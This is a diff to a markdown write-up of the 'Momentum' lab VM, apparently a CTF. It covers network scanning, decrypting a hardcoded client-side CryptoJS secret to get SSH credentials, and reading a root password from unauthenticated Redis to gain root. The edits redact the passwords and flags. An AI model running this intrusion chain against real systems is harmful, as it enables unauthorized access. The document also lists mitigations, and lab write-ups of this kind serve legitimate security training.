@@ -8,7 +8,7 @@
 
 This walkthrough is intended **strictly for educational purposes** and for use in **authorized lab environments only**. Do **not** attempt these techniques on systems you do not own or have explicit permission to test.
 
----
+
 
 ### Lab Setup
 
@@ -17,7 +17,7 @@ This walkthrough is intended **strictly for educational purposes** and for use i
 * **Virtualization:** VirtualBox
 * **Network Mode:** Host-Only Adapter
 
----
+
 
 ### Network Discovery
 
@@ -34,7 +34,6 @@ This scan revealed the target VM at:
 192.168.56.102
 ```
 
----
 
 ### Service Enumeration
 
@@ -121,7 +120,7 @@ gobuster -m dir \
 
 The `/js` directory immediately stood out as a **high-value target**.
 
----
+
 
 ### Client-Side JavaScript Analysis
 
@@ -155,7 +154,7 @@ This immediately indicated:
 * **Hardcoded passphrase**
 * Client-side crypto misuse
 
----
+
 
 ### Decrypting the Encrypted Value
 
@@ -273,7 +272,7 @@ console.log("B64 :", CryptoJS.enc.Base64.stringify(decrypted));
 #### Output
 ![Decryption](screenshots/decryption.png)
 
----
+
 
 ### Initial Foothold (SSH)
 
@@ -282,14 +281,9 @@ The decrypted value was tested as credentials.
 ```bash
 ssh auxerre@192.168.56.102
 ```
+![Foothold](screenshots/initial-foothold.png)
 
-```text
-Password: auxerre-alienum##
-```
 
-**Successful SSH login achieved as user `auxerre`**.
-
----
 
 ### User Flag
 
@@ -299,32 +293,25 @@ cat user.txt
 
 ```text
 [ Momentum - User Owned ]
-flag : 84157165c30ad34d18945b647ec7f647
+flag : $$$$$$$$$$$$$$$$$$$$$$$$$$$
 ```
-
----
 
 ### Privilege Escalation
 
 #### Standard Enumeration (Failed)
 
-The following techniques were attempted without success:
-
-* SUID binaries
-* Linux capabilities
-* `sudo -l`
-* Kernel exploits
-* `linpeas.sh`
+I tried several methods on this step. I looked for SUIDs, Capabilities, sudo privilegies, kernel exploits and tried to use linpeas but all of that were fruitless. I decided to look for unusual processes using the command:
 
 This indicated a **logic-based or service-based escalation path**.
 
----
 
 ### Process Enumeration
 
 ```bash
 ps aux
 ```
+![Privilages escaltion](screenshots/privilages-escalation.png)
+
 
 #### Suspicious Process Identified
 
@@ -338,8 +325,6 @@ Redis was:
 * Unauthenticated
 * Accessible to the compromised user
 
----
-
 ### Redis Abuse
 
 #### Access Redis
@@ -347,47 +332,52 @@ Redis was:
 ```bash
 redis-cli
 ```
+![Privilege Escalation](screenshots/redis-cli%20-%20privilages%20escalation.png)
 
 #### Enumerate Keys
 
 ```redis
-KEYS *
-```
-
-```text
+127.0.0.1:6379> KEYS *
 1) "rootpass"
+127.0.0.1:6379> GET rootpass
+"$$$$$$$$$$$$$$$$"
+127.0.0.1:6379> 
+127.0.0.1:6379> 
+127.0.0.1:6379> 
+127.0.0.1:6379> exit
+
 ```
-
-#### Retrieve Root Password
-
-```redis
-GET rootpass
-```
-
-```text
-m0mentum-al1enum##
-```
-
----
 
 ### Root Access
 
 ```bash
-su root
-Password: m0mentum-al1enum##
-```
-
-```bash
-id
-```
-
-```text
+auxerre@Momentum:~$ su root
+Password: 
+root@Momentum:/home/auxerre# 
+root@Momentum:/home/auxerre# 
+root@Momentum:/home/auxerre# 
+root@Momentum:/home/auxerre# 
+root@Momentum:/home/auxerre# whoami
+root
+root@Momentum:/home/auxerre# 
+root@Momentum:/home/auxerre# id
 uid=0(root) gid=0(root) groups=0(root)
+root@Momentum:/home/auxerre# 
+root@Momentum:/home/auxerre# 
+root@Momentum:/home/auxerre# ls
+user.txt
+root@Momentum:/home/auxerre# cat user.txt 
+[ Momentum - User Owned ]
+---------------------------------------
+flag : $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+---------------------------------------
+root@Momentum:/home/auxerre# 
+root@Momentum:/home/auxerre# 
+root@Momentum:/home/auxerre# 
+root@Momentum:/home/auxerre# 
+
 ```
-
-**Full system compromise achieved**.
-
----
+![Privilages escaltion](screenshots/pwned-gone.png)
 
 ### Final Notes
 
@@ -402,7 +392,7 @@ uid=0(root) gid=0(root) groups=0(root)
 7. Root credential disclosure
 8. Full privilege escalation
 
----
+
 
 ### Mitigations
 
@@ -412,7 +402,7 @@ uid=0(root) gid=0(root) groups=0(root)
 * Never store credentials in Redis
 * Apply principle of least privilege
 
----
+
 
 ### Key Takeaway
 
@@ -420,7 +410,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 This machine demonstrates how **small client-side mistakes** and **poor internal service security** can chain together into a **full system compromise**.
 
----
+
 
 ### Credits
 
@@ -428,6 +418,6 @@ This machine demonstrates how **small client-side mistakes** and **poor internal
 * Momentum VM Author
 * CryptoJS
 
----
+
 
 **Pwned by:** `null0xMAAZ`
